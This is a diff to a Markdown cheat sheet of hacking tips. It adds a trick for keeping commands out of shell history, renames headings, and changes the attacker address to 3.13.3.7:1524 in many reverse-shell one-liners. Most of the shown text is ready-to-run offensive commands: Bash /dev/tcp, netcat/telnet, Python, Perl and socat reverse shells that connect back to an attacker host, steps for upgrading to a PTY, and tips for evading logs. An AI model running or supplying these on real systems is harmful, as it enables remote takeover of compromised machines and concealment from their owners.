@@ -21,6 +21,11 @@ It is good housekeeping to 'commit suicide' when exiting the shell:
 $ kill -9 $$
 ```
 
+Note: Any command starting with a " " (space) will [not get logged history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
+```
+$  id
+```
+
 **2. Almost invisible SSH**
 
 ```
@@ -303,7 +308,7 @@ Store data in `/mnt/crypted`, then unmount:
 # losetup -d /dev/loop0
 ```
 
-**23. Reverse Shell with Bash**
+**23. Reverse shell with Bash**
 
 Start netcat to listen on port 1524 on your system:
 ```
@@ -315,7 +320,7 @@ On the remote system. This Bash will connect back to your system (IP = 3.13.3.7,
 $ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
 ```
 
-**24. Reverse Shell without Bash**
+**24. Reverse shell without Bash**
 
 Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -333,52 +338,63 @@ $ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 
 **24. Reverse shell with Python**
 ```
-$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.55",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 **25. Reverse shell with Perl**
 
 ```
 # method 1
-$ perl -e 'use Socket;$i="10.11.0.55";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+$ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 # method 2
-$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.11.0.55:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 
 **26. Upgrade a dumb shell to a pty shell**
 
+Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:
+
 ```
-# python
+# Python
 python -c 'import pty; pty.spawn("/bin/bash")'
-# perl
+
+# Perl
 perl -e 'exec "/bin/bash";'
-# awk
+
+# Awk
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
 **27. Upgrade a dumb shell to a fully interactive shell with Python and stty**
 
+...and if we also like to use Ctrl-C we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
+
 ```
-# on target host
+# On the target host spwan a PTY using any of the above examples:
 $ python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-# on attacker's host
+
+# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
+# On your terminal execute:
 $ stty raw -echo
+
+# ...and bring the connection back into the foreground:
 $ fg
 $ reset
-# on target host
+
+# On target host
 $ export SHELL=bash
 $ export TERM=xterm-256color
-$ stty rows 43 columns 132
+$ stty rows 24 columns 80
 ```
 
-**28. Spawn a fully interactive reverse shell with socat**
+**28. Reverse shell with socat (fully interactive)**
+...or install socat and get it done without much fiddling about:
 
 ```
 # on attacker's host (listener)
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat file:`tty`,raw,echo=0 tcp-listen:1524
 # on target host (reverse shell)
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.11.0.55:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 ```
 
 --------------------------------------------------------------------------
